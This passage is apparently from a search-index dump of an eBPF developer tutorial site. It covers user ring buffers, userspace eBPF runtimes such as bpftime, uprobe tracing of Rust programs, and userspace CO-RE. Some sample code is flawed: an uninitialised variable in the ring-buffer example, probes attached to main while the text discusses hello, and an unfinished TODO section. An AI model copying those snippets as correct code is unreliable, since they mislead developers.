do_nothing_cb, NULL, 0);\n\n    return 0;\n}\n</code></pre>"},{"location":"tutorials/35-user-ringbuf/#writing-user-mode-programs","title":"Writing User Mode Programs","text":"<p>In user mode, we reserved a section of space in the ring buffer with the <code>ring_buffer_user__reserve</code> function. This space is used to write the information we want to pass to the kernel. Then, the data is submitted using the <code>ring_buffer_user__submit</code> function, after which this data can be read and processed in kernel mode.</p> <pre><code>static int write_samples(struct user_ring_buffer *ringbuf)\n{\n    int i, err = 0;\n    struct user_sample *entry;\n\n    entry = user_ring_buffer__reserve(ringbuf, sizeof(*entry));\n    if (!entry)\n    {\n        err = -errno;\n        goto done;\n    }\n\n    entry-&gt;i = getpid();\n    strcpy(entry-&gt;comm, \"hello\");\n\n    int read = snprintf(entry-&gt;comm, sizeof(entry-&gt;comm), \"%u\", i);\n    if (read &lt;= 0)\n    {\n        /* Assert on the error path to avoid spamming logs with\n         * mostly success messages.\n         */\n        err = read;\n        user_ring_buffer__discard(ringbuf, entry);\n        goto done;\n    }\n\n    user_ring_buffer__submit(ringbuf, entry);\n\ndone:\n    drain_current_samples();\n\n    return err;\n}\n</code></pre>"},{"location":"tutorials/35-user-ringbuf/#initialization-of-the-ring-buffer-and-poll","title":"Initialization of the Ring Buffer and Poll","text":"<p>Finally, initialize the ring buffer and periodically poll, so we can know in real-time the consumption of data in kernel mode. We can also write to the <code>user_ringbuf</code> in user mode, then read and process it in kernel mode.</p> <pre><code>    write_samples(user_ringbuf);\n\n    /* Process events */\n    printf(\"%-8s %-5s %-16s %-7s %-7s %s\\n\",\n           \"TIME\", \"EVENT\", \"COMM\", \"PID\", \"PPID\", \"FILENAME/EXIT CODE\");\n    while (!exiting)\n    {\n        err = ring_buffer__poll(rb, 100 /* timeout, ms */);\n        /* Ctrl-C will cause -EINTR */\n        if (err == -EINTR)\n        {\n            err = 0;\n            break;\n        }\n        if (err &lt; 0)\n        {\n            printf(\"Error polling perf buffer: %d\\n\", err);\n            break;\n        }\n    }\n</code></pre> <p>Through the above steps, we have implemented two-way data transmission between user mode and kernel mode.</p>"},{"location":"tutorials/35-user-ringbuf/#ii-compile-and-run-the-code","title":"II. Compile and Run the Code","text":"<p>To compile and run the above code, we can run the following command:</p> <pre><code>make\n</code></pre> <p>For information on how to install dependencies, refer to: https://eunomia.dev/tutorials/11-bootstrap/</p> <p>The execution result displays how to use the user ring buffer and kernel ringbuffer for efficient data transmission between user mode and kernel mode:</p> <pre><code>$ sudo ./user_ringbuf\nDraining current samples...\nTIME     EVENT COMM             PID   \n16:31:37 SIGN  node             1707   \nDraining current samples...\n16:31:38 SIGN  node             1981   \nDraining current samples...\n16:31:38 SIGN  node             1707   \nDraining current samples...\n16:31:38 SIGN  node             1707   \nDraining current samples...\n</code></pre>"},{"location":"tutorials/35-user-ringbuf/#conclusion","title":"Conclusion","text":"<p>In this article, we discussed how to use eBPF's user ring buffer and kernel ring buffer for data transmission between user mode and kernel mode. Through this method, we can effectively deliver user data to the kernel or feed back kernel-generated data to the user, thus implementing two-way communication between the kernel and user modes.</p> <p>If you want to learn more about eBPF knowledge and practices, you can visit our tutorial code repository at https://github.com/eunomia-bpf/bpf-developer-tutorial or our website at https://eunomia.dev/zh/tutorials/ for more examples and complete tutorials.</p> <p>References:</p> <ol> <li>https://lwn.net/Articles/907056/</li> </ol> <p>Original URL: https://eunomia.dev/zh/tutorials/35-user-ringbuf/ Please indicate the source when reprinting.</p> <p>Share on  Share on </p>"},{"location":"tutorials/36-userspace-ebpf/","title":"Userspace eBPF Runtimes: Overview and Applications","text":"<p>Yusheng Zheng</p> <p>In this blog post, we'll dive into the world of eBPF in userspace. While many are familiar with kernel-based eBPF, userspace eBPF runtimes have been making significant strides and offer compelling use cases. We will also compare userspace eBPF runtimes with Wasm runtimes, another popular technology in the cloud-native and edge computing landscape. Among these, we're excited to introduce bpftime. Powered by an LLVM <code>JIT/AOT</code> backend, our benchmarks suggest that bpftime stands out as one of the fastest userspace eBPF runtimes available.</p>"},{"location":"tutorials/36-userspace-ebpf/#introduction-to-ebpf","title":"Introduction to eBPF","text":""},{"location":"tutorials/36-userspace-ebpf/#what-is-ebpf","title":"What is eBPF?","text":"<p>eBPF, which stands for \"extended Berkeley Packet Filter,\" is a revolutionary technology that facilitates the dynamic tracing and monitoring of kernel operations without modifying kernel source code or rebooting the system. Originally designed for network packet filtering, eBPF has evolved to support a wide range of applications, from performance analysis to security, making it a versatile tool in a system administrator's arsenal.</p> <p>The story of eBPF begins with the Berkeley Packet Filter (BPF), introduced in the early 1990s as a way to filter and capture network packets efficiently. Over the years, BPF proved to be an invaluable asset, but there was room for improvement. eBPF emerged as an advanced iteration of BPF, equipped with a richer instruction set and the capability to interact with kernel data structures directly.</p> <p>The Linux kernel adopted eBPF around 2014, and since then, its popularity and adoption have skyrocketed. Key contributors to the Linux kernel worked diligently to evolve eBPF from a simple packet filter to a generic and powerful bytecode engine.</p>"},{"location":"tutorials/36-userspace-ebpf/#its-significance-in-modern-computing-and-network-solutions","title":"Its significance in modern computing and network solutions","text":"<p>In today's complex computing environments, the need for real-time data and insights is paramount. eBPF shines in this regard, allowing developers and administrators to introspect and modify system behaviors on the fly.</p> <p>Given its dynamic nature, eBPF has become a cornerstone of modern networking solutions. It enables fine-grained traffic control, load balancing, and security enforcement at the kernel level, ensuring optimal performance and security. Furthermore, in the realm of observability, eBPF provides granular insights into system calls, hardware events, and more, facilitating proactive problem detection and resolution.</p>"},{"location":"tutorials/36-userspace-ebpf/#ebpf-from-kernel-runtime-to-userspace-runtime","title":"eBPF: from kernel runtime to userspace runtime","text":"<p>While the initial design of eBPF was deeply embedded within the kernel, the demand for similar functionality in userspace applications led to the evolution of userspace eBPF runtimes. These runtimes allow developers to leverage eBPF's capabilities outside the kernel, expanding its utility and applicability. Userspace eBPF runtimes make it feasible to apply eBPF's prowess to a broader set of applications, from custom network protocols to novel security solutions, further cementing eBPF's role as a transformative technology in the computing landscape.</p>"},{"location":"tutorials/36-userspace-ebpf/#userspace-ebpf-runtimes-and-their-role","title":"Userspace eBPF Runtimes and Their Role","text":""},{"location":"tutorials/36-userspace-ebpf/#what-is-a-userspace-ebpf-runtime","title":"What is a userspace eBPF runtime?","text":"<p>A userspace eBPF runtime provides a platform outside of the kernel to run eBPF programs. While one of eBPF's standout attributes is its capability to execute code within the kernel space, offering rapid observability and data aggregation, there are scenarios where having a userspace alternative becomes valuable. These userspace runtimes extend the reach of eBPF's versatility to areas beyond kernel integrations and often serve as experimental grounds, debugging tools, or frameworks for specific use cases.</p>"},{"location":"tutorials/36-userspace-ebpf/#introduction-to-specific-runtimes","title":"Introduction to specific runtimes","text":""},{"location":"tutorials/36-userspace-ebpf/#ubpf","title":"ubpf","text":"<p>uBPF was among the early attempts to bring eBPF to the userspace. Conceived primarily as a proof-of-concept, it served as a user-space interpretation of an eBPF interpreter combined with an x86_64 and arm64 JIT. Despite its origins as an early prototype, uBPF garnered attention and was utilized as a foundation for high-performance networking projects such as DPDK and Oko. Its non-GPL licensing (Apache) makes it favorable for a wide range of projects, inclusive of proprietary ones. However, as of recent, uBPF is catching up with kernel developments, particularly with contributions from Microsoft for its eBPF Windows implementation. However, develop ubpf and rbpf programs may require a specific toolchain, which may be a barrier for some users. ubpf only have a limited hashmap implementation, which may not be enough for some users.</p>"},{"location":"tutorials/36-userspace-ebpf/#rbpf","title":"rbpf","text":"<p>rbpf is heavily influenced by uBPF but with an emphasis on Rust, a language renowned for its memory safety guarantees. The creation of rbpf was driven by a desire to explore the intersections of eBPF and Rust. While not as widespread in adoption, notable users of rbpf include the Solana team, employing it for blockchain tools with eBPF-driven smart contracts. One of rbpf's advantages lies in its licensing (MIT), allowing for broad reuse across various projects. rbpf also lacks eBPF map support, and only has JIT support for x86_64.</p>"},{"location":"tutorials/36-userspace-ebpf/#bpftime","title":"bpftime","text":"<p>Built atop LLVM JIT/AOT, bpftime is a cutting-edge, high-performance eBPF runtime designed exclusively for userspace operations. It stands out with its rapid Uprobe capabilities and Syscall hooks, notably outperforming the kernel Uprobe by a tenfold margin. Additionally, bpftime offers programmatic syscall hooking, shared memory maps, and compatibility with familiar toolchains like libbpf and clang. Its design addresses some kernel eBPF limitations and outpaces plugin systems like the Wasm runtime in certain aspects.</p>"},{"location":"tutorials/36-userspace-ebpf/#why-is-having-a-userspace-version-of-ebpf-interesting","title":"Why is Having a Userspace Version of eBPF Interesting?","text":"<p>eBPF, while renowned for its kernel-space operations, has observed a growing interest in its userspace adaptations. Here's why migrating eBPF to userspace is capturing the attention of technologists:</p>"},{"location":"tutorials/36-userspace-ebpf/#enhanced-performance","title":"Enhanced Performance","text":"<p>In kernel operations, the Uprobe component of eBPF is often beleaguered by performance inefficiencies, primarily due to the overheads introduced by context switches. In latency-sensitive applications, these inefficiencies can be detrimental, affecting real-time monitoring and data processing. By transitioning to userspace, eBPF can bypass these context switch related delays, leading to a more optimized performance. Runtimes like <code>bpftime</code> exemplify this, offering substantial performance improvements compared to their kernel counterparts.</p>"},{"location":"tutorials/36-userspace-ebpf/#flexibility-and-integration","title":"Flexibility and Integration","text":"<p>Userspace eBPF runtimes champion flexibility. Unlike some alternatives, such as the Wasm runtime, which might necessitate manual integrations, userspace eBPF provides the boon of automatic instrumentation. This means they can be seamlessly introduced into running processes without the need for cumbersome restarts or recompilations, ensuring smoother operational flows.</p>"},{"location":"tutorials/36-userspace-ebpf/#augmented-security","title":"Augmented Security","text":"<p>Operating in kernel mode, eBPF programs require root access, which can inadvertently expand the attack surface, making systems susceptible to vulnerabilities like container escapes or even potential kernel exploits. Userspace runtimes, however, operate outside this high-risk zone. By functioning in userspace, they demand fewer privileges, inherently reducing the potential avenues for security breaches.</p>"},{"location":"tutorials/36-userspace-ebpf/#debugging-and-licensing-flexibility","title":"Debugging and Licensing Flexibility","text":"<p>One of the innate advantages of userspace eBPF runtimes is the ease with which developers can debug their code. The accessibility to integrate breakpoints in a userspace interpreter is a marked advantage over the relatively constrained debugging capabilities in kernel eBPF. Additionally, the licensing flexibility of userspace eBPF runtimes, typically offered under licenses like Apache or MIT, ensures they can be paired with a diverse range of projects, including proprietary ones, sidestepping the GPL constraints associated with kernel code.</p>"},{"location":"tutorials/36-userspace-ebpf/#use-cases-existing-ebpf-userspace-applications","title":"Use Cases: Existing eBPF Userspace Applications","text":"<p>Userspace eBPF is being utilized in a number of notable projects, each harnessing the unique capabilities of eBPF to enhance their functionalities. Here's how Userspace eBPF is currently utilized in various applications:</p> <ol> <li>Oko:</li> </ol> <p>Oko is an extension of Open vSwitch-DPDK that provides runtime extension with BPF programs. It enables the use of BPF programs to process packets in userspace, providing flexible packet processing and facilitating the integration of Open vSwitch with other systems.</p> <ol> <li>DPDK eBPF Support:</li> </ol> <p>The DPDK (Data Plane Development Kit) eBPF support facilitates fast packet processing by enabling the use of eBPF programs in userspace, which can be loaded and run to analyze network packets. This enhances the flexibility and programmability of network applications without requiring kernel modifications.</p> <ol> <li>Solana:</li> </ol> <p>Solana utilizes eBPF to implement a JIT (Just-In-Time) compiler, which is essential for executing smart contracts on its blockchain network. The use of eBPF ensures safety, performance, and architecture agnosticism, thus allowing efficient execution of smart contracts across validator nodes on the Solana blockchain.</p> <ol> <li>eBPF for Windows (Work-In-Progress):</li> </ol> <p>This project is aimed at bringing the eBPF toolchains and APIs familiar in the Linux ecosystem to Windows, allowing existing eBPF toolchains to be utilized on top of Windows. This demonstrates a promising endeavor to extend the capabilities of eBPF beyond Linux, although it's still a work in progress.</p> <p>The benefits of using eBPF in these applications include:</p> <ul> <li>Flexibility: eBPF provides a flexible framework for running programs in the kernel or userspace, enabling developers to extend the functionality of existing systems without modifying their core code.</li> <li>Performance: By allowing JIT compilation and efficient packet processing, eBPF can significantly enhance the performance of network applications and blockchain smart contract execution.</li> <li>Safety and Security: The eBPF framework provides mechanisms for verifying the safety properties of programs before execution, thus ensuring the integrity and security of the systems it is integrated with.</li> <li>Cross-platform Capability: The architecture-agnostic nature of eBPF instruction set enables cross-platform compatibility, as seen in projects like Solana and the work-in-progress eBPF for Windows.</li> </ul> <p>These attributes make eBPF a powerful tool for augmenting a variety of applications, ranging from network processing to blockchain smart contract execution, and beyond. There are also some papers that discuss the use of eBPF in userspace:</p> <ol> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices:</li> </ol> <p>This paper introduces a new hotpatching framework named RapidPatch, which is designed to facilitate the propagation of patches by installing generic patches on heterogeneous embedded devices without disrupting other tasks running on them.</p> <p>Furthermore, RapidPatch proposes two types of eBPF patches for different types of vulnerabilities and develops an eBPF patch verifier to ensure patch safety.</p> <ol> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers:</li> </ol> <p>This paper presents Femto-Containers, a novel framework that enables the secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices over a network.</p> <p>The framework is implemented and provided in RIOT, a popular open source IoT operating system, with an emphasis on secure deployment, execution, and isolation of small virtual software functions on low-power IoT devices, over the network.</p> <p>The paper discusses the implementation of a Femto-Container hosting engine integrated within a common low-power IoT operating system (RIOT), enhancing it with the ability to start, update, or terminate Femto-Containers on demand, securely over a standard IPv6/6LoWPAN network.</p> <p>These papers delve into pertinent advancements concerning firmware patching and lightweight virtualization, demonstrating innovations that address critical challenges in the domains of real-time embedded systems and low-power IoT microcontrollers respectively.</p>"},{"location":"tutorials/36-userspace-ebpf/#userspace-ebpf-runtime-vs-wasm-runtime","title":"Userspace eBPF Runtime vs Wasm Runtime","text":"<p>In the evolving landscape of cloud-native and edge computing, both eBPF (extended Berkeley Packet Filter) and Wasm (WebAssembly) have emerged as powerful tools. However, they come with their own set of design principles and trade-offs.</p>"},{"location":"tutorials/36-userspace-ebpf/#a-comparison-of-ebpf-and-wasm","title":"A Comparison of eBPF and Wasm","text":"<p>eBPF:</p> <ul> <li>Philosophy: eBPF prioritizes performance, often making it the choice for real-time kernel operations and high-throughput networking tasks.</li> <li>Security: While performance takes the forefront, security in eBPF is ensured through the use of a verifier, ensuring that all programs are safe to run without causing kernel panics or infinite loops.</li> </ul> <p>Wasm:</p> <ul> <li>Philosophy: Originally designed for the web, Wasm places a higher emphasis on portability and security. It was conceived to execute code nearly as fast as running native machine code and ensures safety in hostile environments like web browsers.</li> <li>Security: The primary security model for Wasm revolves around Software Fault Isolation (SFI). This model guarantees safe execution by enforcing sandboxing, even though this can introduce some runtime overheads.</li> </ul> <p>For both technologies, reliance on underlying libraries for complex operations is paramount. For instance, Wasm leans on libraries like <code>Wasi-nn</code> for neural network operations. However, when interfacing with such external APIs, especially in Wasm's context, there's a need for additional validation and runtime checks, sometimes leading to substantial performance costs. eBPF, when embedded within the host, capitalizes on its verifier to ensure code safety, offering a more performance-centric approach.</p> <p>On the language support front, while eBPF's niche and specialized nature mean limited language support, Wasm boasts a broader language portfolio due to its origin and design for the web.</p>"},{"location":"tutorials/36-userspace-ebpf/#bpftime-quick-start","title":"bpftime Quick Start","text":"<p>With <code>bpftime</code>, you can build eBPF applications using familiar tools like clang and libbpf, and execute them in userspace. For instance, the <code>malloc</code> eBPF program traces malloc calls using uprobe and aggregates the counts using a hash map.</p> <p>You can refer to documents/build-and-test.md for how to build the project, or using the container images from GitHub packages.</p> <p>To get started, you can build and run a libbpf based eBPF program starts with <code>bpftime</code> cli:</p> <pre><code>make -C example/malloc # Build the eBPF program example\nbpftime load ./example/malloc/malloc\n</code></pre> <p>In another shell, Run the target program with eBPF inside:</p> <pre><code>$ bpftime start ./example/malloc/victim\nHello malloc!\nmalloc called from pid 250215\ncontinue malloc...\nmalloc called from pid 250215\n</code></pre> <p>You can also dynamically attach the eBPF program with a running process:</p> <pre><code>$ ./example/malloc/victim &amp; echo $! # The pid is 101771\n[1] 101771\n101771\ncontinue malloc...\ncontinue malloc...\n</code></pre> <p>And attach to it:</p> <pre><code>$ sudo bpftime attach 101771 # You may need to run make install in root\nInject: \"/root/.bpftime/libbpftime-agent.so\"\nSuccessfully injected. ID: 1\n</code></pre> <p>You can see the output from original program:</p> <pre><code>$ bpftime load ./example/malloc/malloc\n...\n12:44:35 \n        pid=247299      malloc calls: 10\n        pid=247322      malloc calls: 10\n</code></pre> <p>Alternatively, you can also run our sample eBPF program directly in the kernel eBPF, to see the similar output:</p> <pre><code>$ sudo example/malloc/malloc\n15:38:05\n        pid=30415       malloc calls: 1079\n        pid=30393       malloc calls: 203\n        pid=29882       malloc calls: 1076\n        pid=34809       malloc calls: 8\n</code></pre> <p>See documents/usage.md for more details.</p>"},{"location":"tutorials/36-userspace-ebpf/#conclusion","title":"Conclusion","text":"<p>Userspace eBPF runtimes are an exciting development that expands the capabilities of eBPF beyond the kernel. As highlighted in this post, they offer compelling benefits like enhanced performance, flexibility, and security compared to kernel-based eBPF. Runtimes like bpftime demonstrate the potential for substantial speedups, even outperforming alternatives like Wasm runtimes in certain dimensions like low-level performance.</p> <p>With innovative frameworks like RapidPatch and Femto-Containers utilizing userspace eBPF for patching and lightweight virtualization respectively, we are witnessing pioneering use cases that address critical challenges in embedded systems and IoT domains. As eBPF continues its evolution in userspace, we can expect even more creative applications that augment everything from smart contracts to network protocols.</p> <p>While alternatives like Wasm certainly have their place with a strong emphasis on web portability and security, eBPF's specialized nature gives it an edge for performance-critical tasks. Ultimately, the choice between the two depends on the specific use case and priorities. As they continue to evolve, userspace eBPF runtimes are cementing their position as an indispensable part of the cloud-native technology stack, offering an unparalleled combination of safety, efficiency and innovation.</p> <p>We encourage our readers to dive deep into the world of userspace eBPF, starting with our bpftime GitHub repository: https://github.com/eunomia-bpf/bpftime Contributions, feedback, or simply using the tool can further the cause and provide invaluable insights to the community.</p> <p>If you use our project in research, please cite our repo.</p>"},{"location":"tutorials/36-userspace-ebpf/#reference","title":"reference","text":"<ol> <li>bpftime: https://github.com/eunomia-bpf/bpftime</li> <li>ubpf: https://github.com/iovisor/ubpf</li> <li>rbpf: https://github.com/qmonnet/rbpf</li> <li>Oko: https://github.com/Orange-OpenSource/Oko</li> <li>RapidPatch: Firmware Hotpatching for Real-Time Embedded Devices: https://www.usenix.org/conference/usenixsecurity22/presentation/he-yi</li> <li>DPDK eBPF Support: https://www.dpdk.org/wp-content/uploads/sites/35/2018/10/pm-07-DPDK-BPFu6.pdf</li> <li>Solana: https://solana.com/</li> <li>eBPF for Windows (Work-In-Progress): https://github.com/microsoft/ebpf-for-windows</li> <li>Femto-Containers: Lightweight Virtualization and Fault Isolation For Small Software Functions on Low-Power IoT Microcontrollers: https://arxiv.org/abs/2210.03432</li> </ol> <p>Share on  Share on </p>"},{"location":"tutorials/37-uprobe-rust/","title":"eBPF Practice: Tracing User Space Rust Applications with Uprobe","text":"<p>eBPF, or Extended Berkeley Packet Filter, is a revolutionary technology in the Linux kernel that allows developers to run custom \"micro-programs\" in kernel mode, thus changing system behavior or collecting granular performance data without modifying the kernel code.</p> <p>This article discusses how to trace user space Rust applications with Uprobe and eBPF, including how to obtain symbol names and attach them, get function parameters, get return values, etc. This article is part of the eBPF developer tutorial, more detailed content can be found here: https://eunomia.dev/tutorials/ The source code is open source in the GitHub repository.</p>"},{"location":"tutorials/37-uprobe-rust/#uprobe","title":"Uprobe","text":"<p>Uprobe is a user space probe. Uprobe probes allow dynamic instrumentation in user space programs, with instrumentation locations including: function entry points, specific offsets, and function return points. When we define a Uprobe, the kernel creates a fast breakpoint instruction (the int3 instruction on x86 machines) at the attached instruction. When the program executes this instruction, the kernel triggers an event, the program falls into kernel mode, and the probe function is called in a callback manner. After the probe function is executed, it returns to user mode to continue executing subsequent instructions.</p> <p>Uprobe is useful for parsing traffic in user space that cannot be parsed by kernel probes, such as http2 traffic, https traffic, and can also analyze runtime program, business logic, etc. For more information about Uprobe, you can refer to:</p> <ul> <li>eBPF practice tutorial: Use Uprobe to capture plaintext SSL/TLS data from various libraries</li> <li>eBPF practice tutorial: Use Uprobe to capture Golang coroutine switching</li> <li>eBPF practice tutorial: Use Uprobe to capture user space http2 traffic</li> </ul> <p>Running Uprobe in kernel mode eBPF might also produce significant performance overhead, in which case you might consider using user space eBPF runtime, such as bpftime. bpftime is a user-space eBPF runtime based on LLVM JIT/AOT. It can run eBPF Uprobe programs in user mode and is compatible with kernel mode eBPF. Because it avoids context switching between user and kernel modes, bpftime's Uprobe overheads are about 10 times less than the kernel's, and it also more easy to extend.</p>"},{"location":"tutorials/37-uprobe-rust/#rust","title":"Rust","text":"<p>Rust is an open-source systems programming language that focuses on safety, speed, and concurrency. It was developed by Graydon Hoare at the Mozilla Research Center in 2010 and released its first stable version in 2015. The design philosophy of Rust language is to provide the performance advantages of C++ while greatly reducing memory safety vulnerabilities. Rust is gradually popular in the field of systems programming, especially in applications that require high performance, security, and reliability, such as operating systems, file systems, game engines, network services, etc. Many large technology companies, including Mozilla, Google, Microsoft, and Amazon, are using or supporting the Rust language.</p> <p>You can refer to the official Rust website for more information about Rust language and install the Rust toolchain.</p>"},{"location":"tutorials/37-uprobe-rust/#simplest-example-symbol-name-mangling","title":"Simplest example: Symbol name mangling","text":"<p>Let's start with a simple example, tracing the <code>main</code> function of a Rust program with Uprobe, with the code as follows:</p> <pre><code>pub fn hello() -&gt; i32 {\n    println!(\"Hello, world!\");\n    0\n}\n\nfn main() {\n    hello();\n}\n</code></pre> <p>Build and try to get the symbol:</p> <pre><code>$ cd helloworld\n$ cargo build\n$ nm helloworld/target/release/helloworld | grep hello\n0000000000008940 t _ZN10helloworld4main17h2dce92cb81426b91E\n</code></pre> <p>We find that the corresponding symbol has been converted to <code>_ZN10helloworld4main17h2dce92cb81426b91E</code>. This is because rustc uses Symbol name mangling to encode a unique name for the symbols used in the code generation process. The encoded name will be used by the linker to associate the name with the content it points to. The -C symbol-mangling-version option can be used to control the handling of symbol names.</p> <p>We can use the <code>rustfilt</code> tool to parse and obtain the corresponding symbol:</p> <pre><code>$ cargo install rustfilt\n$ nm helloworld/target/release/helloworld &gt; name.txt\n$ rustfilt _ZN10helloworld4main17h2dce92cb81426b91E\nhelloworld::main\n$ rustfilt -i name.txt | grep hello\n0000000000008b60 t helloworld::main\n</code></pre> <p>Next we can try to use bpftrace to trace the corresponding function:</p> <pre><code>$ sudo bpftrace -e 'uprobe:helloworld/target/release/helloworld:_ZN10helloworld4main17h2dce92cb81426b91E { printf(\"Function hello-world called\\n\"); }'\nAttaching 1 probe...\nFunction hello-world called\n</code></pre>"},{"location":"tutorials/37-uprobe-rust/#a-strange-phenomenon-multiple-calls-getting-parameters","title":"A strange phenomenon: multiple calls, getting parameters","text":"<p>For a more complex example, which includes multiple calls and parameter fetching:</p> <pre><code>use std::env;\n\npub fn hello(i: i32, len: usize) -&gt; i32 {\n    println!(\"Hello, world! {} in {}\", i, len);\n    i + len as i32\n}\n\nfn main() {\n    let args: Vec&lt;String&gt; = env::args().collect();\n\n    // Skip the first argument, which is the path to the binary, and iterate over the rest\n    for arg in args.iter().skip(1) {\n        match arg.parse::&lt;i32&gt;() {\n            Ok(i) =&gt; {\n                let ret = hello(i, args.len());\n                println!(\"return value: {}\", ret);\n            }\n            Err(_) =&gt; {\n                eprintln!(\"Error: Argument '{}' is not a valid integer\", arg);\n            }\n        }\n    }\n}\n</code></pre> <p>We repeat a similar operation and notice a strange phenomenon:</p> <pre><code>$ sudo bpftrace -e 'uprobe:args/target/release/helloworld:_ZN10helloworld4main17h2dce92cb81426b91E { printf(\"Function hello-world called\\n\"); }'\nAttaching 1 probe...\nFunction hello-world called\n</code></pre> <p>At this point we expect the hello function to run several times, but bpftrace only prints out one call:</p> <pre><code>$ args/target/release/helloworld 1 2 3 4\nHello, world! 1 in 5\nreturn value: 6\nHello, world! 2 in 5\nreturn value: 7\nHello, world! 3 in 5\nreturn value: 8\nHello, world! 4 in 5\nreturn value: 9\n</code></pre> <p>And it appears that bpftrace cannot correctly get the parameter:</p> <pre><code>$ sudo bpftrace -e 'uprobe:args/target/release/helloworld:_ZN10helloworld4main17h2dce92cb81426b91E { printf(\"Function hello-world called %d\\n\"\n, arg0); }'\nAttaching 1 probe...\nFunction hello-world called 63642464\n</code></pre> <p>The Uretprobe did catch the return value of the first call:</p> <pre><code>$ sudo bpftrace -e 'uretprobe:args/tar\nget/release/helloworld:_ZN10helloworld4main17h2dce92\ncb81426b91E { printf(\"Function hello-world called %d\n\\n\", retval); }'\nAttaching 1 probe...\nFunction hello-world called 6\n</code></pre> <p>This may due to Rust does not have a stable ABI. Rust, as it has existed so far, has reserved the right to order those struct members any way it wants. So the compiled version of the callee might order the members exactly as above, while the compiled version of the programming calling into the library might think its actually laid out like this:</p> <p>TODO: Further analysis (to be continued)</p>"},{"location":"tutorials/37-uprobe-rust/#references","title":"References","text":"<ul> <li>https://doc.rust-lang.org/rustc/symbol-mangling/index.html</li> </ul> <p>Share on  Share on </p>"},{"location":"tutorials/38-btf-uprobe/","title":"Expanding eBPF Compile Once, Run Everywhere(CO-RE) to Userspace Compatibility","text":"<p>Yusheng </p> <p>eBPF, short for extended Berkeley Packet Filter, is a powerful and versatile technology used in modern Linux systems. It allows for the running of sandboxed programs in a virtual machine-like environment within the kernel, providing a safe way to extend the capabilities of the kernel without the risk of crashing the system or compromising security.</p> <p>Co-RE, standing for 'Compile Once, Run Everywhere', tackles the critical issue of eBPF program compatibility across diverse kernel versions. This feature allows eBPF programs to run on various kernel versions without the need for recompilation, simplifying deployment and maintenance.</p> <p>With eBPF Uprobe, you can also trace userspace applications and access their internal data structures. However, the  CO-RE is not designed for userspace applications. This blog will introduce how to leverage CO-RE for user-space applications, ensuring eBPF Uprobe programs remain compatible across different application versions without the need for multiple compilations. </p> <p>This approach may be particularly beneficial for tracing applications like OpenSSL, where maintaining separate eBPF programs for each version is impractical. With userspace eBPF runtimes like bpftime, you can also expand the CO-RE to more usecases, including extensions, networking, and dynamic patching, providing versatile and efficient solutions.</p> <p>To implement the Co-RE feature of eBPF in user-space applications, we also need to utilize the BPF Type Format (BTF) to overcome some of the limitations of traditional eBPF programs. The key to this approach lies in providing user-space programs with similar type information and compatibility support as the kernel, thereby enabling eBPF programs to more flexibly handle different versions of user-space applications and libraries.</p> <p>This article is part of the eBPF Developer Tutorial, and for more detailed content, you can visit https://eunomia.dev/tutorials/. The source code is available on the https://github.com/eunomia-bpf/bpf-developer-tutorial.</p>"},{"location":"tutorials/38-btf-uprobe/#why-we-need-co-re","title":"Why we need CO-RE?","text":"<ul> <li>Kernel Dependencies: Traditional eBPF programs are tightly coupled with the specific Linux kernel version they are compiled for. This is because they rely on specific internal data structures and kernel APIs which can change between kernel versions.</li> <li>Portability Issues: If you wanted to run an eBPF program on different Linux systems with different kernel versions, you'd traditionally have to recompile the eBPF program for each kernel version, which is a cumbersome and inefficient process.</li> </ul>"},{"location":"tutorials/38-btf-uprobe/#the-co-re-solution","title":"The Co-RE Solution","text":"<ul> <li>Abstracting Kernel Dependencies: Co-RE enables eBPF programs to be more portable by abstracting away specific kernel dependencies. This is achieved through the use of BPF Type Format (BTF) and relocations.</li> <li>BPF Type Format (BTF): BTF provides rich type information about data structures and functions in the kernel. This metadata allows eBPF programs to understand the layout of kernel structures at runtime.</li> <li>Relocations: eBPF programs compiled with Co-RE support contain relocations that are resolved at load time. These relocations adjust the program's references to kernel data structures and functions according to the actual layout and addresses in the running kernel.</li> </ul>"},{"location":"tutorials/38-btf-uprobe/#advantages-of-co-re","title":"Advantages of Co-RE","text":"<ol> <li>Write Once, Run Anywhere: eBPF programs compiled with Co-RE can run on different kernel versions without the need for recompilation. This greatly simplifies the deployment and maintenance of eBPF programs in diverse environments.</li> <li>Safety and Stability: Co-RE maintains the safety guarantees of eBPF, ensuring that programs do not crash the kernel and adhere to security constraints.</li> <li>Ease of Development: Developers don't need to worry about the specifics of each kernel version, which simplifies the development of eBPF programs.</li> </ol>"},{"location":"tutorials/38-btf-uprobe/#problem-userspace-application-co-re","title":"Problem: userspace application CO-RE","text":"<p>The eBPF also supports tracing userspace applications. Uprobe is a user-space probe that allows dynamic instrumentation in user-space programs. The probe locations include function entry, specific offsets, and function returns.</p> <p>The BTF is designed for the kernel and generated from vmlinux, it can help the eBPF program to be easily compatible with different kernel versions.</p> <p>The userspace application, however, also need CO-RE. For example, the SSL/TLS uprobe is widely used to capture the plaintext data from the encrypted traffic. It is implemented with the userspace library, such as OpenSSL, GnuTLS, NSS, etc. The userspace application and libraries also has different versions, it would be complex if we need to compile and maintain the eBPF program for each version.</p> <p>Let's see what will happen if CO-RE is not enabled for userspace applications, and how the BTF from userspace applications can solve this.</p>"},{"location":"tutorials/38-btf-uprobe/#no-btf-for-userspace-program","title":"No BTF for userspace program","text":"<p>This is a simple uprobe example, it can capture the function call and arguments of the <code>add_test</code> function in the userspace program. You can add <code>#define BPF_NO_PRESERVE_ACCESS_INDEX</code> in the <code>uprobe.bpf.c</code> to make sure the eBPF program can be compiled without BTF for <code>struct data</code>.</p> <pre><code>#define BPF_NO_GLOBAL_DATA\n#define BPF_NO_PRESERVE_ACCESS_INDEX\n#include &lt;vmlinux.h&gt;\n#include &lt;bpf/bpf_helpers.h&gt;\n#include &lt;bpf/bpf_tracing.h&gt;\n\nstruct data {\n        int a;\n        int c;\n        int d;\n};\n\nSEC(\"uprobe/examples/btf-base:add_test\")\nint BPF_UPROBE(add_test, struct data *d)\n{\n    int a = 0, c = 0;\n    bpf_probe_read_user(&amp;a, sizeof(a), &amp;d-&gt;a);\n    bpf_probe_read_user(&amp;c, sizeof(c), &amp;d-&gt;c);\n    bpf_printk(\"add_test(&amp;d) %d + %d = %d\\n\", a, c,  a + c);\n    return a + c;\n}\n\nchar LICENSE[] SEC(\"license\") = \"Dual BSD/GPL\";\n</code></pre> <p>Then, we have two different versions of the userspace program, <code>examples/btf-base</code> and 